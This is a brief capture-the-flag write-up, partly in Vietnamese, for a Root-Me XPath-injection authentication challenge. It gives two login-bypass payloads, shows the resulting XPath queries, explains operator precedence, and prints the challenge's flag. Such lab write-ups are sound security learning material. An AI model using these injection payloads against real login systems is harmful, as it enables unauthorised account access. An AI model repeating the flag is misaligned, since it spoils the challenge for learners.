# [XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)

## Solutions

Nếu XPATH có dạng `"//user[user='' and pass='']";`, test:

- `username=' or ''='&password=' or ''='`:
  - => `"//user[user='' or ''='' and pass='' or ''='']";`
  - vào được với node user đầu tiên trong xml

- `username=John' or '1'='2&password=a`:
  - => `"//user[user='John' or '1'='2' and pass='a']";`
  - and trước or sau nên chỉ cần user có tồn tại là ok
  - vào được với node user John

Flag: `6FkC67ui8njEepIK5Gr2Kwe`

## New Knowledge

`and` has higher priority than `or`

## References

- <https://www.php.net/manual/en/language.operators.precedence.php>
- <https://www.w3schools.com/xml/xpath_intro.asp>
